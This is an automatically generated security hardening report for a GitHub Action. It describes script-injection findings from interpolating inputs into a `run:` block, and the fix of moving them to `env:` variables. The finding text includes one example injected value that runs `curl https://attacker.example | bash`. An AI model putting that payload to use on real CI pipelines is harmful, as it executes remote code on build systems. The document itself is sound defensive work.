<!-- markdownlint-disable -->

# Hardening Report: buildpacks--github-actions--setup-tools/v6.1.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **buildpacks--github-actions--setup-tools/v6.1.1** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Two `${{ inputs.* }}` expressions are directly interpolated inside the `run:` shell block (sub-rule a). `CRANE_VERSION=${{ inputs.crane-version }}` and `YJ_VERSION=${{ inputs.yj-version }}` embed user-supplied input values directly into the shell script via YAML template substitution before the shell ever parses the string. A caller can supply a crafted value such as `0.19.1; curl https://attacker.example | bash #` to execute arbitrary commands. These values should instead be passed via `env:` variables and referenced as quoted shell variables (e.g., `"$CRANE_VERSION"`) with no `${{ }}` expression inside the `run:` block.

Locations:

- `action.yml:32`
- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.crane-version }}" appears directly in run: block of step "Install additional buildpack management tools"; move to env: map

Locations:

- `action.yml:32`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.yj-version }}" appears directly in run: block of step "Install additional buildpack management tools"; move to env: map

Locations:

- `action.yml:45`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection

**Notes:**

Moved `${{ inputs.crane-version }}` and `${{ inputs.yj-version }}` from the `run:` shell block into the step's `env:` map as `CRANE_VERSION` and `YJ_VERSION`. The shell script now references these as `${CRANE_VERSION}` and `${YJ_VERSION}` — plain environment variables — eliminating the template-injection risk. The inline assignments `CRANE_VERSION=${{ inputs.crane-version }}` and `YJ_VERSION=${{ inputs.yj-version }}` were removed from the script body since the values are now provided via the env: block.

